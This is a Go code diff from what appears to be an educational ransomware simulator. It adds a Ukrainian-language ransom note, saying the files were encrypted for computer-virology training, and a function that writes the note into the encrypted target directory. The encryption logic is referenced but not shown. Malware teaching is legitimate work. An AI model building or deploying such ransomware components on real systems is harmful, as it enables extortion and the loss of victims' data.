@@ -18,6 +18,13 @@ import (
 
 const sshPubKey = `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuaKdhK+oaLF2UtyMlVmFCqC4fqPYPTGd+ewTJSYBXU8ZRXFH9TTD4JGl7HFMbLSgG2ER5VvsnfQu1WD0fQT2ndzLl47yJkrQmHwuI3UJjcafr0Ej7vhnVHhTux61DL+DZZ45cmtaxE2bnGERCjq3PtIZGV8fPxV+zD0l1eKD3abHwdA1VxUBX3AbdJWlKD01hUuWIxohC2RYxZFfjlLdQM64XylIuSOFcLNmJZINVI5oSh2fQxP2YxS/PQW+SC9Y+yQA+/zHOlFToxYz3uW3RPxul8BDOJPKeLyNKQO+mLNFgkZrdkJXL+9kvTZdqdC4E7BFKg2721aECy53SuAZz Artur@gora`
 
+const ransomNoteName = "README_FOR_DECRYPT.txt"
+const ransomNoteText = `УВАГА!
+
+ВАШІ ФАЙЛИ БУЛИ ЗАШИФРОВАНІ В НАВЧАЛЬНИХ ЦІЛЯХ.
+ДЛЯ ВІДНОВЛЕННЯ ВИКОРИСТАЙТЕ ТЕСТОВИЙ ДЕШИФРУВАЛЬНИК ТА ПРИВАТНИЙ КЛЮЧ.
+ЖОДНІ ДАНІ НЕ БУЛИ ЗНИЩЕНІ ПОПРАВДІ, ЦЕ СИМУЛЯЦІЯ ДЛЯ КОМП'ЮТЕРНОЇ ВІРУСОЛОГІЇ.`
+
 func main() {
 	targetDir := parseTargetDirectory()
 	fmt.Printf("[*] Target directory: %s\n", targetDir)
@@ -39,7 +46,12 @@ func main() {
 		panic(err)
 	}
 
-	fmt.Println("[+] Encryption complete. lock.dat created.")
+	// 4. Create a ransom note file with requirements
+	if err := createRansomNote(targetDir); err != nil {
+		panic(err)
+	}
+
+	fmt.Println("[+] Encryption complete. lock.dat and ransom note created.")
 }
 
 func parseTargetDirectory() string {
@@ -141,4 +153,9 @@ func parsePublicKey(pemStr string) *rsa.PublicKey {
 		panic(err)
 	}
 	return parsedPub.(ssh.CryptoPublicKey).CryptoPublicKey().(*rsa.PublicKey)
+}
+
+func createRansomNote(targetDir string) error {
+	notePath := filepath.Join(targetDir, ransomNoteName)
+	return os.WriteFile(notePath, []byte(ransomNoteText), 0644)
 }
